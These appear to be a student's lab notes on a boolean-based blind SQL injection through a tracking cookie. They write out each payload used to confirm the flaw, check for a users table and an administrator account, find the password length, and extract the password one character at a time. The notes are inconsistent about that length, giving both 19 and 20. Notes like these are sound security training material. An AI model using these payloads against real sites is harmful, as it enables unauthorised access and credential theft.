Lab 11- Blind SQL Injections attack


Valnerable parameter: Cookie

End Goals:
1. Enumerate the password of the administrator
2. Log in as the administrator

Analysis:
1) Confirm that the parameter is vulnerable to blind SQLi
Select tracking-id from tracking table where trackingId = ""
-> If this id exists -> query returns value -> welcome back
-> If this id doesn't exist -> no message

select tracking-d from tracking-table where trackingid = 'CSV4FVI9FVDm20yU' and 1=1-- /this is the query we are assuming

Tracking id = CSV4FVI9FVDm20yU' and 1=1-- /welcome
Tracking id = CSV4FVI9FVDm20yU' and 1=2-- /No message

2) Confirm that we have a users table
-- This SQL injection payload checks if the 'users' table exists by attempting to select 'x' from it.
-- If the subquery returns a result, the condition is true and the query behaves as normal (returns a row).
-- If the table does not exist, the subquery fails and the condition is false (no row returned).
select tracking-d from tracking-table where trackingid = 'CSV4FVI9FVDm20yU' and (select 'x' from users LIMIT 1)='x'--'
Success so user table exists

3) Confirm that username administrator exists

select tracking-d from tracking-table where trackingid = 'CSV4FVI9FVDm20yU' and (select username from users where username = 'administrator')='administrator'--'
-- This payload checks if the username 'administrator' exists in the users table.
-- The subquery returns 'administrator' if such a user exists, making the condition true and returning a row.
-- If 'administrator' does not exist, the condition is false and no row is returned.

Success so username administrator exists

4) Find the length of the password
select tracking-d from tracking-table where trackingid = 'CSV4FVI9FVDm20yU' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--
19
Steps:
1. We bruteforce with the Intruder
2) Parameterize the Length (select username from users where username='administrator' and LENGTH(password)>$1$)
3.)Chekc the length of the response, 20th response is less than 19 , so we are missing the welcome back
4) we know the exact value is 20


5) Now we find the first character

select tracking-d from tracking-table where trackingid = 'CSV4FVI9FVDm20yU' and (select substring(password, 1,1) from users where username ='administrator') ='a'--

its b with the intruder bruteforcer attack
In the pro version we can set two payloads for the query. One for the number of password position and the other for alphanumeric
In free we have to do for all 19 positions

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
b996rc0fqbayv05bns2l 